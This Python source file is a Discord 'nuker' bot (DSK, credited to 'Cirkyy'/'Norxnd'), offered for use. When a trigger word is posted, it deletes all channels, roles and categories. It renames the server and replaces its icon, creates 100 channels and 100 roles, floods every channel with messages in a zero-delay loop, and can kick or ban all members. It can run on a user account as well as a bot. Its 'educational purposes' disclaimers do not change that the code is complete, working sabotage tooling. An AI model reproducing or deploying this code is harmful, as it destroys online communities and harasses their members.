from discord import Client
from datetime import datetime
from discord.ext import tasks
import requests
import base64
import traceback
import colorama
from colorama import Fore, init, Style
import os
os.system('mode con: cols=155 lines=50')

# CONFIG

print(f"""{Style.BRIGHT}{Fore.RED}
░█████╗░████████╗██████╗░░█████╗░██████╗░███████╗░██████╗
██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝
██║░░╚═╝░░░██║░░░██████╔╝███████║██║░░██║█████╗░░╚█████╗░
██║░░██╗░░░██║░░░██╔══██╗██╔══██║██║░░██║██╔══╝░░░╚═══██╗
╚█████╔╝░░░██║░░░██║░░██║██║░░██║██████╔╝███████╗██████╔╝
░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░ℭ𝔦𝔯𝔨𝔶𝔶 v2
{Style.RESET_ALL}{Fore.WHITE}{Fore.RESET}""")

print("DSK is SpamBot that you can run on bot user or own account. It will destroy given server with these steps:\n"
      " * Deleteing everything\n"
      " * Changing server name and picture\n"
      " * Creating 100 roles and channels\n"
      " * Sending no-cooldown messages to all channels\n"
      " * Kicking or banning everyone (Optional/Beta/Need ban or kick perms)\n"
      "When bot triggers with magic world it will immediately start destruction, without any confirmation!\n"
      "Invite client (bot or account) only to servers you WANT to destroy!"
      "I am not responsible for you destroying own server.\n\nATTANTION:\nYou are using this bot on your own "
      "responsibility "
      " and I'm (Norxnd) not responsible for any damage caused by you!\nPlease use it for educational purposes, "
      "not to destroy someone's work!\nIm not evil for creating this, you are evil for using this.\nIf you server "
      "has been destroyed with this tool, blame person who used it, not me, and Im sorry!\n\n"
      "Made by ℭ𝔦𝔯𝔨𝔶𝔶, use it for good purposes.\n\n")


TOKEN = input(
    "Enter the token of your bot or account (threatens with a ban) > ")
TOKEN = TOKEN.strip()
print(f"[{datetime.now()} INFO]: The token has been entered.")

CHANNELS_NAME = input("Enter the names of the channels to be created > ")
CHANNELS_NAME = CHANNELS_NAME.strip()
print(f"[{datetime.now()} INFO]: Channel names have been entered.")

ROLES = input("Enter the names of the role to be created > ")
ROLES = ROLES.strip()
print(f"[{datetime.now()} INFO]: Channel names have been entered.")

SERVER_NAME = input("Enter a new server name > ")
SERVER_NAME = SERVER_NAME.strip()
print(f"[{datetime.now()} INFO]: The server name has been entered.")

IMAGE_URL = input("Enter the URL to the new server image > ")
IMAGE_URL = IMAGE_URL.strip()
print(f"[{datetime.now()} INFO]: URL has been entered.")

MESSAGE_CONTENT = input(
    "Enter the text of the message to be sent to the chat > ")
MESSAGE_CONTENT = MESSAGE_CONTENT.strip()
print(f"[{datetime.now()} INFO]: The text has been entered.")

BANKICK_CHOIICE = input(
    "Do you want members to be ban [b] or kick [k] ? Or not [n] ? > ")
BANKICK_CHOIICE = BANKICK_CHOIICE.strip()
if BANKICK_CHOIICE == "b" or BANKICK_CHOIICE == "B":
    BANKICK_CHOIICE = 2
    print(f'[{datetime.now()} INFO]: "Ban members" has been selected.')
elif BANKICK_CHOIICE == "k" or BANKICK_CHOIICE == "K":
    BANKICK_CHOIICE = 1
    print(f'[{datetime.now()} INFO]: "Kick members" has been selected.')
else:
    BANKICK_CHOIICE = 0
    print(f'[{datetime.now()} INFO]: "Do nothing" was selected or you entered something wrong.')

MAGIC_WORD = input("Enter the text that will trigger bot start > ")
print(f"[{datetime.now()} INFO]: The Magic World has been entered.")


# Destruction code
client = Client()


@client.event
async def on_ready():
    print(f"[{datetime.now()} INFO]: The bot is ready to use.")


# tasks bc roles all bugged
@tasks.loop(seconds=0)
async def send(guild, wiad):
    for channel in guild.text_channels:
        try:
            await channel.send(wiad)
        except Exception:
            print(f"[{datetime.now()} WARN] {guild.id}: Message sending error!")


@tasks.loop(count=1)
async def kickorban(guild):
    if BANKICK_CHOIICE == 1:
        for member in guild.members:
            try:
                await member.kick()
            except Exception:
                print(f"[{datetime.now()} WARN] {guild.id}: Member kicking error!")
        print(
            f"[{datetime.now()} INFO] {guild.id}: All members that can be kick was kicked out.")
    elif BANKICK_CHOIICE == 2:
        for member in guild.members:
            try:
                await member.ban()
            except Exception:
                print(f"[{datetime.now()} WARN] {guild.id}: Members banning error!")
        print(
            f"[{datetime.now()} INFO] {guild.id}: All members that can be banned was banned.")
    else:
        pass


async def start(guild):
    print(f"[{datetime.now()} INFO] {guild.id}: I am starting the destruction of the {guild.name} server.")

    server_cleanup = {'t': guild.text_channels, 'v': guild.voice_channels,
                      'r': guild.roles, 'c': guild.categories}

    # Czyści serwer
    for x in server_cleanup['t']:
        try:
            await x.delete()
        except Exception:
            print(
                f"[{datetime.now()} WARN] {guild.id}: Error deleting text channels!")
    for x in server_cleanup['v']:
        try:
            await x.delete()
        except Exception:
            print(
                f"[{datetime.now()} WARN] {guild.id}: Error deleting voice channels!")

    for x in server_cleanup['r']:
        try:
            await x.delete()
            pass
        except Exception:
            print(f"[{datetime.now()} WARN] {guild.id}: Error deleting roles!")

    for x in server_cleanup['c']:
        try:
            await x.delete()
        except Exception:
            print(f"[{datetime.now()} WARN] {guild.id}:Channel creation error!!")

    print(f"[{datetime.now()} INFO] {guild.id}: The server has been wiped.")

    try:
        await guild.edit(name=SERVER_NAME)
    except Exception:
        print(f"[{datetime.now()} WARN] {guild.id}: Error renaming the server!")

    try:
        response = requests.get(IMAGE_URL)
        image_bytes = base64.b64encode(response.content)
        await guild.edit(icon=image_bytes)
    except Exception:
        print(
            f"[{datetime.now()} WARN] {guild.id}: Error changing the server picture!")

    print(f"[{datetime.now()} INFO] {guild.id}: The server name and image has been changed.")

    for x in range(100):
        try:
            await guild.create_text_channel(name=CHANNELS_NAME)
        except Exception:
            print(f"[{datetime.now()} WARN] {guild.id}: Error creating the channel!")

    print(f"[{datetime.now()} INFO] {guild.id}: The channels have been created.")

    print(f"[{datetime.now()} INFO] {guild.id}: I start sending a message.")

    send.start(guild, MESSAGE_CONTENT)
    kickorban.start(guild)

    for x in range(100):
        try:
            await guild.create_role(name=ROLES)
        except Exception:
            print(f"[{datetime.now()} WARN] {guild.id}: Error creating the role!")

    print(f"[{datetime.now()} INFO] {guild.id}: The roles have been created.")
# KOD NISZCZENIA


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if MAGIC_WORD == message.content:
        await start(message.guild)

try:
    client.run(TOKEN)
except Exception:
    print(f"[{datetime.now()} ERROR]: Could not start client, token may be invalid.")
